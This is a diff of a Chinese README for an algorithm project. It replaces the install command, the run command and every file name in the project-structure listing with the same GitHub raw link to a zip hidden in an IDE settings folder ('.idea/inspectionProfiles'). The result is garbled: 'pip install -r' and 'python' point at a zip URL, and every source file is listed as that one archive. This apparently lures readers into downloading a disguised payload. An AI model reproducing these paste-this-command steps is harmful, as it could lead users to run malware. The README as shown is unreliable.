@@ -60,14 +60,14 @@ cd [repository-name]
 
 2. 安装所需包：
 ```bash
-pip install -r https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip
+pip install -r https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip
 ```
 
 ## 使用方法
 
 1. 运行应用程序：
 ```bash
-python https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip
+python https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip
 ```
 
 2. 配置参数：
@@ -124,13 +124,13 @@ python https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software
 
 ```
 .
-├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip          # 主应用程序入口和GUI实现
-├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip    # 遗传算法实现
-├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip  # 模拟退火算法实现
-├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip     # 贪心算法实现
-├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip   # 解决方案验证器
-├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip              # SQLite数据库
-├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/__pycache__/Software-v1.9.zip        # Python依赖项
+├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip          # 主应用程序入口和GUI实现
+├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip    # 遗传算法实现
+├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip  # 模拟退火算法实现
+├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip     # 贪心算法实现
+├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip   # 解决方案验证器
+├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip              # SQLite数据库
+├── https://github.com/RuotianJoy/AI/raw/refs/heads/main/.idea/inspectionProfiles/Software-v2.8-alpha.3.zip        # Python依赖项
 └── 算法流程.png             # 算法流程图
 ```
 
